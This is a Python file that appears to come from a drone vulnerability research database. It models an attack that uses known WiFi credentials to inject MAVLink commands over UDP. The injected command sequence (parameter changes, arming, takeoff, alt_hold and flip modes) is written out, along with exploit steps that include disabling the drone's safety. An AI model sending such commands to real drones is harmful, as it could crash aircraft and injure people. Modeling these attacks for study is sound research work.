from saci.modeling import CPV

from saci_db.vulns.wifi_knowncreds_vuln import WifiKnownCredsVuln
from saci_db.vulns.mavlink_mitm_vuln import MavlinkMitmVuln

# need model for TXBackpack

from saci.modeling.attack.packet_attack_signal import PacketAttackSignal
from saci.modeling.attack.base_attack_vector import BaseAttackVector
from saci.modeling.attack.base_attack_impact import BaseAttackImpact

from saci.modeling.device import (
    Wifi,
    Mavlink,
    Controller,
    Motor,
)
from saci.modeling.state import GlobalState


class AltHoldParamMisimplementation(CPV):
    NAME = "Altitude Hold Mode Parameter Misimplementation"

    def __init__(self):
        super().__init__(
            required_components=[
                Wifi(),  # This is the entry component (Required)
                Mavlink(),  # This is a vulnerable required component (Required)
                Controller(),  # Changed from PX4Controller() to Controller() for generalization (Required)
                Motor(),
            ],
            entry_component=Wifi(),
            exit_component=Motor(),
            vulnerabilities=[WifiKnownCredsVuln(), MavlinkMitmVuln()],
            initial_conditions={
                "Position": "Any",
                "Heading": "Any",
                "Speed": "Any (>0)",
                "Environment": "Any",
                "RemoteController": "On",
                "CPSController": "Moving",
                "Operating mode": "Stabilize",
            },
            attack_requirements=[
                "Computer",
                "WiFi card",
                "MAVProxy",
                "WiFi Credentials",
            ],
            attack_vectors=[
                BaseAttackVector(
                    name="MavLink Packets Injection",
                    signal=PacketAttackSignal(src=Wifi(), dst=Controller()),
                    required_access_level="Proximity",
                    configuration={
                        "protocol": "UDP",
                        "port": "14555",
                        "command": [
                            "param set ATC_RAT_RLL_FF 0.432304",
                            "param set ATC_RATE_R_MAX 11",
                            "mode guided",
                            "arm throttle",
                            "takeoff 50",
                            "mode alt_hold",
                            "mode flip",
                        ]
                    },
                )
            ],
            attack_impacts=[
                BaseAttackImpact(
                    category="Loss of Control",
                    description="The CPS will experience altitude loss when switched to alt_hold mode, which further leads to crashing when switched to flip mode",
                )
            ],
            exploit_steps=[
                "TA1 Exploit Steps",
                "Extract the controller firmware using the EXPLODE tool",
                "Analyze the firmware to check for the parameters",
                
                "TA2 Exploit Steps",
                "Setup software-in-the-loop simulation environment with Gazebo",
                "Simulate in the simulation environment to validate the attack",
                "Observe drone behavior in Gazebo",
                "Assess the impact of the attack based on simulation results",
                "Report findings to TA3 for physical CPS device experimentation",

                "TA3 Exploit Steps",
                "Turn on controller and drone system",
                "Launch MAVProxy with command: mavproxy.py --master=udp:0.0.0.0:14555 --console",
                "Disable drone safety (press black button for 2 seconds)",
                "Switch to 'Stabilize' mode",
                "Execute command sequence in MAVProxy console",
                "Document all system responses and behaviors",
            ],
            associated_files=[],
            reference_urls=[],
        )

    def in_goal_state(self, state: GlobalState):
        # TODO
        pass
